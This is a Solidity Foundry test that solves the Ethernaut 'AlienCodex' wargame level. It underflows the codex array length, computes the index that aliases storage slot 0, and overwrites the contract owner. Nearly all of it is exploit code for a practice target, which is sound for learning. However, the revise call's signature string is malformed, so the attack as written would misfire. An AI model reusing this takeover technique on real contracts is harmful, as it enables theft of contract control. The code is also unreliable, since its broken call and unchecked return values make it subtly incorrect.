//SPDX-Lincense-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";



contract AlienCodexTest is DSTest {
    Vm vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testAlienCodexHack() public {
        //LEVEL SETUP
         bytes memory bytecode = abi.encodePacked(vm.getCode("ethernaut/AlienCodex/AlienCodex.json"));
        address alienCodexContract;
        // level needs to be deployed this way as it only works with 0.5.0 solidity version
        assembly {
            alienCodexContract := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(tx.origin);

        //LEVEL ATTACK
        //make contact to bypass modifier
        alienCodexContract.call(abi.encodeWithSignature("make_contact()"));
        //call retract to underflow codex.length and occupy all available contract slots
        alienCodexContract.call(abi.encodeWithSignature("retract()"));
        //Find the index in the array that corresponds to slot0
        uint codexIndexForSlotZero = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        //Make address to replace owner. Ensure it is 32bytes padded to overwrite the whole slot
        bytes32 PaddedAddress = bytes32(abi.encode(tx.origin));
        //call revise and change the data on storage zero
        alienCodexContract.call(abi.encodeWithSignature("revise(uint256, bytes32", codexIndexForSlotZero, PaddedAddress));



        //LEVEL SUBMISSION
        (bool success, bytes memory data) = alienCodexContract.call(abi.encodeWithSignature("owner()"));
         address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));
        vm.stopPrank();
        assertEq(refinedData, tx.origin);
    }
}
